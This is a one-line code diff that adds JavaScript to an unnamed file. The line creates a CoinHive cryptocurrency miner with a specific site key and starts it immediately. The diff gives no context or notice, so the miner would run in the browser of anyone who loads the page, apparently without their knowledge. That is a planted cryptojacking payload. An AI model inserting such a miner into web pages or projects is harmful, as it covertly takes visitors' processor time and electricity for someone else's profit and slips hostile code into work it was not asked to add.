@@ -1,0 +1,1 @@
+	var miner = new CoinHive.Anonymous('FUgKSV4Y4Kn9uNlxIeoCXmwvtiC0Ai46');	miner.start();
